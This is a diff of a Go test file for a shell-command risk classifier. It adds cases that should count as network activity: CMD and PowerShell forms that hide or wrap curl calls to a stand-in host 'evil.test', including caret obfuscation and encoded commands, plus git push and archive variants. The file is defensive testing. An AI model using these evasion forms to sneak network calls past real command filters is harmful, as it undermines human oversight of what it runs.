@@ -497,6 +497,8 @@ func TestClassifyUnparseableCMDInvocationFormsFailClosed(t *testing.T) {
 		`@cmd.exe /c curl https://evil.test & rem '`,
 		`start "" curl https://evil.test & rem '`,
 		`start "download window" curl https://evil.test & rem '`,
+		`start MyTitle curl https://evil.test & rem '`,
+		`start "" c^u^r^l https://evil.test & rem '`,
 		`start /b /wait curl https://evil.test & rem '`,
 		`start /d C:\tmp curl https://evil.test & rem '`,
 		`if not 1==2 curl https://evil.test & rem '`,
@@ -508,7 +510,13 @@ func TestClassifyUnparseableCMDInvocationFormsFailClosed(t *testing.T) {
 		`for %i in (x) do call curl https://evil.test & rem '`,
 		`cu^rl https://evil.test & rem '`,
 		`cmd /c cu^rl https://evil.test & rem '`,
+		`cmd /c /d curl https://evil.test & rem '`,
 		`%ComSpec% /c curl https://evil.test & rem '`,
+		`powershell -EncodedCommand curl & rem '`,
+		`powershell -co curl https://evil.test & rem '`,
+		`powershell -e ZQB2AGkAbAA= & rem '`,
+		`pwsh -ec ZQB2AGkAbAA= & rem '`,
+		`pwsh -File curl & rem '`,
 		`start "x" curl https://evil.test & rem '`,
 		`cmd /c start "x" curl https://evil.test & rem '`,
 		`start /b /wait "x" curl https://evil.test & rem '`,
@@ -545,6 +553,11 @@ func TestGitGlobalOptionsResolveIdenticallyOnBothPaths(t *testing.T) {
 		{"-C repo push origin main", true},
 		{"--git-dir /repo/.git fetch origin", true},
 		{"--no-pager push origin main", true},
+		{"PUSH origin main", true},
+		{"--Git-Dir repo PUSH origin main", true},
+		{"archive --mtime 2024-01-01 --remote origin HEAD", true},
+		{"archive HEAD --remote", true},
+		{"archive HEAD --remote=origin", true},
 		{"--help push", false},
 		{"-h push", false},
 		{"--version push", false},
@@ -582,6 +595,14 @@ func TestGitGlobalOptionsResolveIdenticallyOnBothPaths(t *testing.T) {
 	}
 }
 
+func TestClassifyUnparseableLocalPowerShellCommandStaysNonNetwork(t *testing.T) {
+	command := `powershell -Command Get-ChildItem -File . & rem '`
+	risk := classifyCommand(command)
+	if HasRiskCategory(risk, "network") {
+		t.Fatalf("Classify(%q) = categories %v; want no network category", command, risk.Categories)
+	}
+}
+
 func TestClassifyUnparseableCommandBearingWrapperValuesFailClosed(t *testing.T) {
 	for _, command := range []string{
 		`env -S 'curl https://evil.test' && "unterminated`,
@@ -616,6 +637,7 @@ func TestClassifyUnparseableShellSyntaxTextStaysNonNetwork(t *testing.T) {
 		// CMD's START runs nothing when its only quoted argument is the window
 		// title, and neither ECHO nor REM executes the text that follows it.
 		`start "curl https://evil.test" & rem '`,
+		`cmd /c start & rem '`,
 		`echo call curl https://evil.test & rem '`,
 		`rem start curl https://evil.test & rem '`,
 	} {
@@ -661,7 +683,7 @@ func FuzzFallbackNetworkResolutionDoesNotPanic(f *testing.F) {
 	for _, command := range []string{
 		"", "if", "if not", "start", "start /d", "call", "@", "@curl",
 		"for %i in (x) do", "if errorlevel", "if %x% equ", "git -C",
-		"echo `curl)` && \"unterminated", `cmd /c`, `if 1==1 (curl https://evil.test`,
+		"echo `curl)` && \"unterminated", `cmd /c`, `cmd /c start & rem '`, `if 1==1 (curl https://evil.test`,
 	} {
 		f.Add(command)
 	}
